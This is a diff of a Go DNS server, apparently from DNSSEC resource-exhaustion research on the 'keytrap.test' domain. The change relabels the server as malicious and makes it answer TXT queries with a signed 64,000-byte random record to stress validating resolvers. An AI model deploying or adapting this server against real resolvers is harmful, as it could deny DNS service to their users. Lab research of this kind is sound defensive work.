@@ -1,11 +1,15 @@
 /*
 @Author : idealeer&4stra
-@File : dns_auth.go
+@File : LargeRRSET.go
 @Software: GoLand
 @Time : 6/2/2022 09:31
 
 	: 10/14/2024 16:28
+	: 10/14/2024 20:03
+@Description:
+	Malfare DNS Server which can response large RRSET.
 */
+
 package main
 
 import (
@@ -22,6 +26,22 @@ import (
 	"github.com/tochusc/gopacket/layers"
 	"github.com/tochusc/gopacket/pcap"
 )
+
+var txtRecordByteLenC = 64000
+
+func genRandomByte(byteLen int) []byte {
+	b := make([]byte, byteLen)
+	_, err := rand.Read(b)
+	if err != nil {
+		fmt.Println("Error: ", err)
+		os.Exit(1)
+	}
+	return b
+}
+
+var txtLoadC = [][]byte{
+	genRandomByte(txtRecordByteLenC),
+}
 
 // DNS服务器配置相关变量
 var (
@@ -107,6 +127,17 @@ var (
 )
 
 var rrsig = map[string]*RRSIG{
+	"TXT": {
+		TypeCovered: uint16(layers.DNSTypeTXT),
+		Algorithm:   14,
+		Labels:      3,
+		OriginalTTL: globalTTL,
+		Expiration:  expiration,
+		Inception:   inception,
+		KeyTag:      zskKeyTag,
+		SignerName:  signerName,
+		Signature:   signatures["www.keytrap.test."],
+	},
 	"www.keytrap.test": {
 		TypeCovered: uint16(layers.DNSTypeA),
 		Algorithm:   14,
@@ -240,16 +271,6 @@ type DNSSECRR interface {
 	Len() uint16
 }
 
-func genRandomByte(byteLen int) []byte {
-	b := make([]byte, byteLen)
-	_, err := rand.Read(b)
-	if err != nil {
-		fmt.Println("Error: ", err)
-		os.Exit(1)
-	}
-	return b
-}
-
 // dnsResponseC响应DNS请求，生成DNS回复并发送。
 func dnsResponseC(dstMAC net.HardwareAddr, dstIP string, dstPort layers.UDPPort, qname string, qtype layers.DNSType, txid uint16) {
 	fmt.Printf("%s : fm %s query %s %s\n", time.Now().Format(time.ANSIC), dstIP, qname, qtype.String())
@@ -296,7 +317,7 @@ func dnsResponseC(dstMAC net.HardwareAddr, dstIP string, dstPort layers.UDPPort,
 
 	var dnsLayer *layers.DNS
 	switch qtype {
-	case layers.DNSTypeA:
+	case layers.DNSTypeTXT:
 		if _, ok := rrsig[qname]; !ok {
 			// 未配置的域名，返回NXDOMAIN
 			dnsLayer = &layers.DNS{
@@ -332,9 +353,6 @@ func dnsResponseC(dstMAC net.HardwareAddr, dstIP string, dstPort layers.UDPPort,
 				Z:            0,
 				ResponseCode: 0,
 				QDCount:      1,
-				ANCount:      2,
-				NSCount:      2,
-				ARCount:      2,
 				Questions: []layers.DNSQuestion{
 					{
 						Name:  []byte(qname),
@@ -345,10 +363,10 @@ func dnsResponseC(dstMAC net.HardwareAddr, dstIP string, dstPort layers.UDPPort,
 				Answers: []layers.DNSResourceRecord{
 					{
 						Name:  []byte(qname),
-						Type:  layers.DNSTypeA,
+						Type:  layers.DNSTypeTXT,
 						Class: layers.DNSClassIN,
 						TTL:   uint32(globalTTLC),
-						IP:    net.ParseIP(serverIPC),
+						TXTs:  txtLoadC,
 					},
 					// RRSIG
 					{
@@ -356,8 +374,8 @@ func dnsResponseC(dstMAC net.HardwareAddr, dstIP string, dstPort layers.UDPPort,
 						Type:       layers.DNSTypeRRSIG,
 						Class:      layers.DNSClassIN,
 						TTL:        uint32(globalTTLC),
-						DataLength: rrsig[qname].Len(),
-						Data:       rrsig[qname].Serialize(),
+						DataLength: rrsig["TXT"].Len(),
+						Data:       rrsig["TXT"].Serialize(),
 					},
 				},
 				Authorities: []layers.DNSResourceRecord{
